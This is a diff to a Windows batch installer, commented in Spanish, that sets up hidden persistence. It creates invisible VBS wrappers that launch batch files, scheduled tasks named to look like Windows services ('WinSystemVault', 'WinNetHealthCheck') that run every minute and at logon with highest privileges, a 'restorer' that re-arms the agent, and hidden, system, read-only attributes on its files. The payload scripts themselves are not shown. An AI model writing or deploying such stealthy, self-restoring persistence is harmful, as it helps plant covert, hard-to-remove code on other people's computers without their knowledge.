@@ -51,20 +51,24 @@ attrib +h +s +r "%TARGET_RESET%" >nul 2>&1
 :: --- 5. CREACIÓN DEL WRAPPER VBS (Invisible) ---
 echo Set WshShell = CreateObject("WScript.Shell") > "%DIR_AGENTE%\run.vbs"
 echo WshShell.Run "cmd.exe /c %DIR_AGENTE%\sys_engine.bat", 0, False >> "%DIR_AGENTE%\run.vbs"
+
+echo Set WshShell = CreateObject("WScript.Shell") > "%DIR_SISTEMA%\runHealth.vbs"
+echo WshShell.Run "cmd.exe /c %DIR_SISTEMA%\WinNetHealth.bat", 0, False >> "%DIR_SISTEMA%\runHealth.vbs"
 :: --- 6. REGISTRO DE TAREAS (Configuración de Testeo) ---
 
 :: Tarea 1: El Agente (Ejecución cada 1 minuto)
 :: El parámetro /f se encarga de sobreescribir si la tarea ya existe.
-schtasks /create /tn "WinSystemVault" /tr "wscript.exe \"%DIR_AGENTE%\run.vbs\"" /sc minute /mo 1 /rl highest /f >nul 2>&1
+    schtasks /create /tn "WinSystemVault" /tr "wscript.exe \"%DIR_AGENTE%\run.vbs\"" /sc minute /mo 1 /rl highest /f >nul 2>&1
 
-:: Tarea 2: El Restaurador (Ejecución al iniciar sesión)
-:: El parámetro /f se encarga de sobreescribir si la tarea ya existe.
-schtasks /create /tn "WinNetHealthCheck" /tr "cmd.exe /c \"%DIR_SISTEMA%\WinNetHealth.bat\"" /sc onlogon /rl highest /f >nul 2>&1
+    :: Tarea 2: El Restaurador (Ejecución al iniciar sesión)
+    :: El parámetro /f se encarga de sobreescribir si la tarea ya existe.
+    schtasks /create /tn "WinNetHealthCheck" /tr "cmd.exe /c \"%DIR_SISTEMA%\runHealth.vbs\"" /sc onlogon /rl highest /f >nul 2>&1
 
 :: --- 7. PROTECCIÓN FINAL Y LIMPIEZA ---
 attrib +h +s +r "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
 attrib +h +s +r "%DIR_AGENTE%\run.vbs" >nul 2>&1
 attrib +h +s +r "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1
+attrib +h +s +r "%DIR_SISTEMA%\runHealth.vbs" >nul 2>&1
 
 :: Ejecutamos el restaurador una vez para confirmar que todo arrancó bien
 start /b "" cmd /c "%DIR_SISTEMA%\WinNetHealth.bat"
